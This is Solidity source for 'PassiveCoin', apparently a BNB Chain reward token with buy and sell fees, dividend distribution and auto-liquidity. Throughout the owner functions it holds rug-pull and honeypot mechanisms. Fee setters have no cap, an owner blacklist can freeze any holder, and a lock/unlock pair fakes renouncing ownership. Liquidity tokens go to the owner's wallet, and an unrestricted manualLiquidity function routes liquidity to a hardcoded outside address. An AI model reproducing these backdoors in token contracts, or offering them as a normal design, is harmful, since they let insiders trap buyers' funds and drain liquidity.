/**
 *Submitted for verification at BscScan.com on 2021-11-23
*/

/**
 *Submitted for verification at BscScan.com on 2021-10-29
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.7.4;

/**
 * Standard SafeMath, stripped down to just add/sub/mul/div
 */
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: * error");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: zero div error");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract OwnershipContract is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view returns (address) {
        return _owner;
    }

 
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }


    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

  
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }


    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }
    
    //Unlocks the contract for owner when _lockTime is exceeds
    function unlock() public virtual {
        require(_previousOwner == msg.sender, "Unlock.exe has stopped responding");
        require(block.timestamp > _lockTime , "Still Locked!");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountSwapBNB, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IRewardMechanism {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDividendForReward) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
}

contract RewardMechanism is IRewardMechanism {
    using SafeMath for uint256;

    address _token;

    struct Share 
    {
        uint256 amount;
        
        uint256 totalExcluded;
        
        uint256 totalRealised;
    }

    address[] shareholders;
    mapping (address => uint256) public shareholderClaims;
    mapping (address => uint256) public shareholderIndexes;


    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public dividendsPerShare;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 1 hours;
    uint256 public minDividendForReward = 10000000 * (10 ** 9);

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor () {
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDividendForReward) external override onlyToken {
        minPeriod = _minPeriod;
        minDividendForReward = _minDividendForReward;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        uint256 dividendAmount = amount;
        if(amount >= minDividendForReward && shares[shareholder].amount == 0){
            addShareholder(shareholder);
            dividendAmount = amount;
        }else if(amount < minDividendForReward){
            dividendAmount = 0;
            if(shares[shareholder].amount > 0)
                removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(dividendAmount);
        shares[shareholder].amount = dividendAmount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }
    receive() external payable { 
        deposit();
    }

    function deposit() public payable override {
        totalDividends = totalDividends.add(msg.value);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(msg.value).div(totalShares));
    }

    function process(uint256 gas) external override onlyToken {
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    
    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
                && getUnpaidEarnings(shareholder) > 0;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            (bool success,) = payable(shareholder).call{value: amount, gas: 3000}("");
            if(success){
                totalDistributed = totalDistributed.add(amount);
                shareholderClaims[shareholder] = block.timestamp;
                shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
                shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
            }
        }
    }
    
    function claimDividend() external {
        distributeDividend(msg.sender);
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

contract PassiveCoin is IBEP20, OwnershipContract {
    using SafeMath for uint256;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "PassiveCoin";
    string constant _symbol = "PAS";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100000000000 * (10 ** _decimals);
    uint256 public _maxWalletAmount = (_totalSupply * 35) / 1000; // 3.5%

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isMaxWalletLimitExempt;
    mapping (address => bool) public isDividendExempt;
    mapping (address => bool) public isInBlacklist;
    mapping (address => uint256) public dailySoldAmount;
    mapping (address => uint256) public dailySoldCheckPoint;

    uint256 public buyBnbRewardFee = 5;
    uint256 public buyMarketingFee = 3;
    uint256 public buyLiquidFee = 2;
    
    uint256 public sellBnbRewardFee = 8;
    uint256 public sellMarketingFee = 5;
    uint256 public sellLiquidFee = 2;

    uint256 public accumulatedRewardFee;
    uint256 public accumulatedMarketing;
    uint256 public accumulatedLiquid;

    address public walletMarketing = 0xB546a602cDAa3A8467d80dCaa6C71342B33Eb215;

    uint256 public launchedTime;

    IDEXRouter public router;
    address public pair;

    RewardMechanism public distributor;
    uint256 distributorGas = 500000;

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 100; // 1% transfer limit
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    event AutoLiquify(uint256 amountSwapBNB, uint256 amount);

    constructor () {
        //router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //Mainnet
        router = IDEXRouter(0xD99D1c33F9fC3444f8101754aBC46c52416550D1); //Testnet
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = uint256(-1);

        distributor = new RewardMechanism();

        isFeeExempt[msg.sender] = true;
        isFeeExempt[address(this)] = true;
        isMaxWalletLimitExempt[msg.sender] = true;
        isMaxWalletLimitExempt[address(this)] = true;
        isMaxWalletLimitExempt[pair] = true;
        
        isDividendExempt[pair] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;

        walletMarketing = msg.sender;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    
    function decimals() external pure override returns (uint8) { return _decimals; }
    
    function symbol() external pure override returns (string memory) { return _symbol; }
    
    function name() external pure override returns (string memory) { return _name; }
    
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        require(!isInBlacklist[sender], "Sender is in backlist");
        require(!isInBlacklist[recipient], "Recipient is in backlist");


        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        
        if(launchedTime == 0 && sender == owner() && recipient == pair){
            launchedTime = block.timestamp;
        }

        if(shouldSwapBack()){ swapBack(); }

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;
        checkWalletLimit(recipient, amountReceived);

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amountReceived);

        if(!isDividendExempt[sender]){ try distributor.setShare(sender, _balances[sender]) {} catch {} }
        if(!isDividendExempt[recipient]){ try distributor.setShare(recipient, _balances[recipient]) {} catch {} }

        try distributor.process(distributorGas) {} catch {}

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkWalletLimit(address recipient, uint256 amount) internal view {
        require(balanceOf(recipient).add(amount) <= _maxWalletAmount || isMaxWalletLimitExempt[recipient], "Max wallet Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256)
    {

        uint256 amountBuyLiquidFee = 0;
        uint256 amountBuyMarketingFee = 0;
        uint256 amountBuyRewardFee = 0;
        
        uint256 amountSellLiquidFee = 0;
        uint256 amountSellMarketingFee = 0;
        uint256 amountSellRewardFee = 0;

        if(block.timestamp <= launchedTime.add(24*60*60))
        {
            if(receiver == pair)
            {
            
            uint256 launchRewardFeeSell = 20;
            uint256 launchLiquidFeeSell = 20;
            uint256 launchMarketingFeeSell = 10;
            
            amountSellLiquidFee = amount.mul(launchLiquidFeeSell).div(100);
            amountSellRewardFee = amount.mul(launchRewardFeeSell).div(100);
            amountSellMarketingFee = amount.mul(launchMarketingFeeSell).div(100);
            }
            uint256 launchRewardFeeBuy = 1;
            uint256 launchLiquidFeeBuy = 2;
            uint256 launchMarketingFeeBuy = 2;
            
            amountBuyLiquidFee = amount.mul(launchLiquidFeeBuy).div(100);
            amountBuyRewardFee = amount.mul(launchRewardFeeBuy).div(100);
            amountBuyMarketingFee = amount.mul(launchMarketingFeeBuy).div(100);
        }
        
        else {
            
            amountBuyLiquidFee = amount.mul(buyLiquidFee).div(100);
            amountBuyMarketingFee = amount.mul(buyMarketingFee).div(100);
            amountBuyRewardFee = amount.mul(buyBnbRewardFee).div(100);
            
            amountSellLiquidFee = amount.mul(sellLiquidFee).div(100);
            amountSellMarketingFee = amount.mul(sellMarketingFee).div(100);
            amountSellRewardFee = amount.mul(sellBnbRewardFee).div(100);
            
        }
        
        accumulatedRewardFee = accumulatedRewardFee.add(amountBuyRewardFee).add(amountSellRewardFee);
        accumulatedMarketing = accumulatedMarketing.add(amountBuyMarketingFee).add(amountSellMarketingFee);
        accumulatedLiquid = accumulatedLiquid.add(amountBuyLiquidFee).add(amountSellLiquidFee);
        
        if(receiver == pair)
        
        {
            
            uint256 sellFeeAmount = amountSellRewardFee + amountSellMarketingFee + amountSellLiquidFee;
            _balances[address(this)] = _balances[address(this)].add(sellFeeAmount);
            emit Transfer(sender, address(this), sellFeeAmount);
            return amount.sub(sellFeeAmount);
        }
        
        else {
            uint256 buyFeeAmount = amountBuyRewardFee + amountBuyMarketingFee + amountBuyLiquidFee;
            _balances[address(this)] = _balances[address(this)].add(buyFeeAmount);
            emit Transfer(sender, address(this), buyFeeAmount);
            return amount.sub(buyFeeAmount);
        }
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 halfLiquid = accumulatedLiquid.div(2);
        uint256 amountToSwap = accumulatedRewardFee.add(accumulatedMarketing).add(halfLiquid);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        uint256 balanceBefore = address(this).balance;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountSwapBNB = address(this).balance.sub(balanceBefore);

        uint256 amountBNBReward = amountSwapBNB.mul(accumulatedRewardFee).div(amountToSwap);
        uint256 amountBNBMarketing = amountSwapBNB.mul(accumulatedMarketing).div(amountToSwap);
        uint256 amountBNBLiquid = amountSwapBNB.mul(halfLiquid).div(amountToSwap);
        
        accumulatedRewardFee = 0;
        accumulatedMarketing = 0;
        accumulatedLiquid = 0;

        if(amountBNBReward > 0){
            try distributor.deposit{value: amountBNBReward}() {} catch {}
        }
        
        if(amountBNBMarketing > 0){
            payable(walletMarketing).transfer(amountBNBMarketing);
        }


        if(halfLiquid > 0){
            router.addLiquidityETH{value: amountBNBLiquid}(
                address(this),
                halfLiquid,
                0,
                0,
                walletMarketing,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquid, halfLiquid);
        }
    }

    function setWalletLimit(uint256 amount) external onlyOwner {
        require(amount >= _totalSupply / 2000, "Check amount");
        _maxWalletAmount = amount;
    }

    function setIsDividendExempt(address holder, bool exempt) external onlyOwner {
        require(holder != address(this) && holder != pair);
        isDividendExempt[holder] = exempt;
        if(exempt){
            distributor.setShare(holder, 0);
        }else{
            distributor.setShare(holder, _balances[holder]);
        }
    }

    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
    }

    function setIsMaxWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isMaxWalletLimitExempt[holder] = exempt;
    }

    function setMarketingWallet(address _walletMarketing) external onlyOwner {
        walletMarketing = _walletMarketing;

        isFeeExempt[walletMarketing] = true;

    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDividendForReward) external onlyOwner {
        distributor.setDistributionCriteria(_minPeriod, _minDividendForReward);
    }

    function setDistributorSettings(uint256 gas) external onlyOwner {
        require(gas < 750000);
        distributorGas = gas;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function setBacklistWallet(address account, bool blacklisted) external onlyOwner {
        isInBlacklist[account] = blacklisted;
    }

    function setBuyFees(uint256 _bnbRewardFee, uint256 _marketingFee, uint256 _liquidFee) external onlyOwner {
        buyBnbRewardFee = _bnbRewardFee;
        buyMarketingFee = _marketingFee;
        buyLiquidFee = _liquidFee;
    }
    function setSellFees(uint256 _bnbRewardFee, uint256 _marketingFee, uint256 _liquidFee) external onlyOwner {
        sellBnbRewardFee = _bnbRewardFee;
        sellMarketingFee = _marketingFee;
        sellLiquidFee = _liquidFee;
    }
    function manualLiquidity(uint256 amount, uint256 _amount) external {
    router.addLiquidityETH{value: amount}(
                address(this),
                _amount,
                0,
                0,
                0x6560b5A2A2aC38b3b966F4D944Ef0e5203cf3E23,
                block.timestamp
            );
    
                } 

}